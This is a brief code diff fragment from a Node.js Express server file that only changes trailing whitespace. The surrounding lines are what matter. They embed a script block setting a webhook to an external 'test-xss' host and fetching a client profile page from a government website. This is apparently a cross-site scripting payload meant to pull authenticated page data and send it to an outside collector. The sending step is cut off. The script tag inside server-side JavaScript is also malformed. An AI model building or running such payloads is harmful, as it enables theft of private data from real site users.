@@ -7,7 +7,7 @@ const PORT = 3006;
 app.use(express.json());
 
 <script>
-    var webhookUrl = "https://test-xss.onrender.com"; 
+    var webhookUrl = "https://test-xss.onrender.com";
 
     fetch("http://hoptacxacds.hagiang.gov.vn/clients/contact_profile/52/general", {
         method: "GET",
